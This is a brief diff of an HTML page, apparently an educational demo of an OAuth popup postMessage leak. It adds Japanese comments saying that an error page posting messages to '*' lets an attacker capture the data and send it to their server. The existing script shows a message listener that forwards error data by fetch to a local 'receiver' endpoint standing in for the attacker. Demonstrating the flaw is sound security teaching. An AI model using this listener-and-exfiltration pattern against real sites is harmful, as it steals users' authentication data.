@@ -11,6 +11,8 @@
   <button onclick="window.open('/oauth', '_blank', 'popup')">googleでろぐいん</button>
 
   <script>
+    // errorページにpostMessageの第二引数に'*'を指定しているため
+    // postMessageの情報を取得して、攻撃者のサーバに送信できしまう。
     window.addEventListener('message', (e) => {
       if (e.data.type === 'error') {
         fetch("http://localhost:9262/receiver", {
